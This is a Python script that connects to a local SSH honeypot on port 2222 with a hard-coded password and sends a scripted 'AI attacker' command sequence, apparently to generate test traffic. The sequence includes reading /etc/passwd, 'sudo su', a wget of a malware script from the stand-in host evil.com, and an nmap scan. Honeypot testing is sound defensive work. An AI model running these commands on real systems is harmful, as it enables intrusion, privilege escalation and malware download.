import paramiko
import time
import random
import socket

TARGET_HOST = "localhost"
TARGET_PORT = 2222
USERNAME = "admin"
PASSWORD = "attack123"

ATTACK_CHAINS = [
    ["ls", "pwd", "whoami"],
    ["cat /etc/passwd"],
    ["sudo su"],
    ["wget http://evil.com/malware.sh"],
    ["nmap localhost"]
]


def safe_send(channel, command):
    """
    Safely send a command to the SSH channel
    """
    if channel.closed:
        return False

    try:
        channel.send(command + "\n")
        return True
    except (socket.error, OSError):
        return False


def run_attack_chain(ssh):
    channel = ssh.invoke_shell()
    time.sleep(1.5)  # allow shell to fully initialize

    for chain in ATTACK_CHAINS:
        for command in chain:
            print(f"[AI-ATTACKER] Executing: {command}")

            if not safe_send(channel, command):
                print("[AI-ATTACKER] Channel closed by honeypot")
                return

            time.sleep(random.uniform(1.0, 2.0))

    # exit safely
    safe_send(channel, "exit")
    time.sleep(1)
    channel.close()


def start_ai_attacker():
    print("[+] AI Attacker starting...")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(
            TARGET_HOST,
            port=TARGET_PORT,
            username=USERNAME,
            password=PASSWORD,
            timeout=10
        )
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return

    print("[+] Connected to honeypot")

    try:
        run_attack_chain(ssh)
    except Exception as e:
        print(f"[!] Attack interrupted: {e}")

    ssh.close()
    print("[+] AI Attacker finished")


if __name__ == "__main__":
    start_ai_attacker()
